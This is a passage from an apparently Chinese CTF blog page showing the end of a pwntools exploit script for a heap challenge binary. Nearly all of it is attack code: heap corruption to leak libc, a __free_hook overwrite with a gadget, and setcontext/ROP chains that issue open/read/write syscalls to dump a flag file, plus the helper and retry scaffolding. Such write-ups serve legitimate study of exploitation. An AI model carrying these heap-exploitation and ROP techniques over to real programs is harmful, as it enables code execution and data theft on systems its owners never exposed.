        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> size<span class="token punctuation">,</span> syscall6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    my_new<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span>
    heap3 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x520</span>
    my_dele<span class="token punctuation">(</span>heap3<span class="token punctuation">)</span>

    my_edit<span class="token punctuation">(</span>heap1<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> heap3<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    my_show<span class="token punctuation">(</span>heap3<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;ontent: &quot;</span><span class="token punctuation">)</span>
    main_aeran <span class="token operator">=</span> u64<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_aeran<span class="token punctuation">)</span><span class="token punctuation">)</span>
    LIBC <span class="token operator">=</span> main_aeran <span class="token operator">-</span> <span class="token number">0x1ebbe0</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>LIBC<span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./libc.so.6&quot;</span><span class="token punctuation">)</span>
    env <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span> <span class="token operator">+</span> LIBC 

    gadget <span class="token operator">=</span> LIBC <span class="token operator">+</span> <span class="token number">0x0000000000154930</span>
    setcontext <span class="token operator">=</span> LIBC <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span>
    fhook <span class="token operator">=</span> LIBC <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>

    my_edit<span class="token punctuation">(</span>heap2<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>flat<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> fhook<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    my_edit<span class="token punctuation">(</span>fhook<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>flat<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token triple-quoted-string string">'''
    my_new(0x500)
    heap4 = heap3 
    my_edit(heap4, 0x100000004)

    ret = LIBC + 0x00000000000c054a
    poprax = 0x4a550 + LIBC
    poprdi = 0x26b72 + LIBC
    poprsi = 0x27529 + LIBC
    poprdx = 0x11c371 + LIBC
    syscall = 0x66229 + LIBC

    flag = heap4 + 0xb0

    payload = flat(
        0, heap4, 0, 0, # 0
        setcontext+0x3d, 0, # 0x20 
        0, 0, # 30
        0, 0, # 40 
        0, 0, # 50 
        0, 0, # 60 
        0, 0, # 70
        0, 0, # 80 
        0, 0, # 90 
        heap4+0x100, ret, # a0
        # stack 0xb0
        './flag\x00'
        ).ljust(0x100, b'b') 
    payload += flat(
        # open(&quot;./flag&quot;)
        poprax, 2, 
        poprdi, flag, 
        poprsi, 0, 
        poprdx, 0, 0, 
        syscall, 
        # read(3, buf, 0x100)
        poprax, 0, 
        poprdi, 3, 
        poprsi, flag, 
        poprdx, 0x100, 0, 
        syscall, 
        # write(1, buf, 0x100)
        poprax, 1, 
        poprdi, 1, 
        poprsi, flag, 
        poprdx, 0x100, 0, 
        syscall
            )

    sl(payload)

    my_dele(heap4)
    '''</span>


    <span class="token triple-quoted-string string">'''
    my_edit(heap2, 0x100000004)
    payload = flat('a' * 0x20, 0, 0x21, env, 0x1000)
    sl(payload)
    my_show(env)
    ru(&quot;ontent: &quot;)
    stack = u64(re(6, 2).ljust(8, b'\x00'))
    print(hex(stack))

    stack = stack - 0x140 

    my_new(0x30)
    heap4 = heap3

    my_edit(heap4, 0x100000004)
    sl(flat('./flag\x00'.ljust(0x500, 'v'), 0, 0x21, stack, 0x1000))

    poprax = 0x4a550 + LIBC
    poprdi = 0x26b72 + LIBC
    poprsi = 0x27529 + LIBC
    poprdx = 0x11c371 + LIBC
    syscall = 0x66229 + LIBC

    my_edit(stack, 0x100000004)
    sl(flat(
        # open(&quot;./flag&quot;)
        poprax, 2, 
        poprdi, heap4, 
        poprsi, 0, 
        poprdx, 0, 0, 
        syscall, 
        # read(3, buf, 0x100)
        poprax, 0, 
        poprdi, 3, 
        poprsi, heap4, 
        poprdx, 0x100, 0, 
        syscall, 
        # write(1, buf, 0x100)
        poprax, 1, 
        poprdi, 1, 
        poprsi, heap4, 
        poprdx, 0x100, 0, 
        syscall
        ))

    '''</span>


context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rbin'</span><span class="token punctuation">)</span>
    <span class="token comment"># cn = process(['./ld', './bin'], env={&quot;LD_PRELOAD&quot;:&quot;./libc&quot;})</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    cn <span class="token operator">=</span> remote<span class="token punctuation">(</span> <span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gdba</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    cmd <span class="token operator">=</span><span class="token string">'set follow-fork-mode parent\n'</span>
    <span class="token comment">#cmd=''</span>
    <span class="token keyword">if</span> pie<span class="token punctuation">:</span>
        cmd <span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *$rebase({:#x})\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>cn<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>

re  <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> t <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>m<span class="token punctuation">,</span> timeout<span class="token operator">=</span>t<span class="token punctuation">)</span>
recv<span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sll <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> cn<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>
<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util <span class="token keyword">import</span> cyclic
ff  <span class="token operator">=</span> <span class="token keyword">lambda</span> arg<span class="token punctuation">,</span> f<span class="token operator">=</span>cyclic<span class="token punctuation">.</span>de_bruijn<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token operator">=</span><span class="token boolean">None</span> <span class="token punctuation">:</span>flat<span class="token punctuation">(</span><span class="token operator">*</span>arg<span class="token punctuation">,</span> filler<span class="token operator">=</span>f<span class="token punctuation">,</span> length<span class="token operator">=</span>l<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./bin&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        exp1<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            cn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;none&quot;</span><span class="token punctuation">)</span>
exp2<span class="token punctuation">(</span><span class="token punctuation">)</span>

slog_show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br><span class="line-number">196</span><br><span class="line-number">197</span><br><span class="line-number">198</span><br><span class="line-number">199</span><br><span class="line-number">200</span><br><span class="line-number">201</span><br><span class="line-number">202</span><br><span class="line-number">203</span><br><span class="line-number">204</span><br><span class="line-number">205</span><br><span class="line-number">206</span><br><span class="line-number">207</span><br><span class="line-number">208</span><br><span class="line-number">209</span><br><span class="line-number">210</span><br><span class="line-number">211</span><br><span class="line-number">212</span><br><span class="line-number">213</span><br><span class="line-number">214</span><br><span class="line-number">215</span><br><span class="line-number">216</span><br><span class="line-number">217</span><br><span class="line-number">218</span><br><span class="line-number">219</span><br><span class="line-number">220</span><br><span class="line-number">221</span><br><span class="line-number">222</span><br><span class="line-number">223</span><br><span class="line-number">224</span><br><span class="line-number">225</span><br><span class="line-number">226</span><br><span class="line-number">227</span><br><span class="line-number">228</span><br><span class="line-number">229</span><br><span class="line-number">230</span><br><span class="line-number">231</span><br><span class="line-number">232</span><br><span class="line-number">233</span><br><span class="line-number">234</span><br><span class="line-number">235</span><br><span class="line-number">236</span><br><span class="line-number">237</span><br><span class="line-number">238</span><br><span class="line-number">239</span><br><span class="line-number">240</span><br><span class="line-number">241</span><br><span class="line-number">242</span><br><span class="line-number">243</span><br><span class="line-number">244</span><br><span class="line-number">245</span><br><span class="line-number">246</span><br><span class="line-number">247</span><br><span class="line-number">248</span><br><span class="line-number">249</span><br><span class="line-number">250</span><br><span class="line-number">251</span><br><span class="line-number">252</span><br><span class="line-number">253</span><br><span class="line-number">254</span><br><span class="line-number">255</span><br><span class="line-number">256</span><br><span class="line-number">257</span><br><span class="line-number">258</span><br><span class="line-number">259</span><br><span class="line-number">260</span><br><span class="line-number">261</span><br><span class="line-number">262</span><br><span class="line-number">263</span><br><span class="line-number">264</span><br><span class="line-number">265</span><br><span class="line-number">266</span><br><span class="line-number">267</span><br><span class="line-number">268</span><br><span class="line-number">269</span><br><span class="line-number">270</span><br><span class="line-number">271</span><br><span class="line-number">272</span><br><span class="line-number">273</span><br><span class="line-number">274</span><br><span class="line-number">275</span><br><span class="line-number">276</span><br><span class="line-number">277</span><br><span class="line-number">278</span><br><span class="line-number">279</span><br><span class="line-number">280</span><br><span class="line-number">281</span><br><span class="line-number">282</span><br><span class="line-number">283</span><br><span class="line-number">284</span><br><span class="line-number">285</span><br></div></div></details></div></div> <!----> <div class="page-edit"><!----> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">7/30/2021, 1:29:31 AM</span></div></div> <div class="page-nav-wapper"><!----> <!----></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:wl200103124@163.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/wlingze" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://blog.csdn.net/wlz_lc_4" title="csdn" target="_blank" class="iconfont icon-csdn"></a><a href="https://www.zhihu.com/people/wlingze" title="zhihu" target="_blank" class="iconfont icon-zhihu"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2022
    <span>lingze | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.01f8cc77.js" defer></script><script src="/assets/js/2.5ece5099.js" defer></script><script src="/assets/js/38.c6a43a23.js" defer></script>
  </body>
</html>
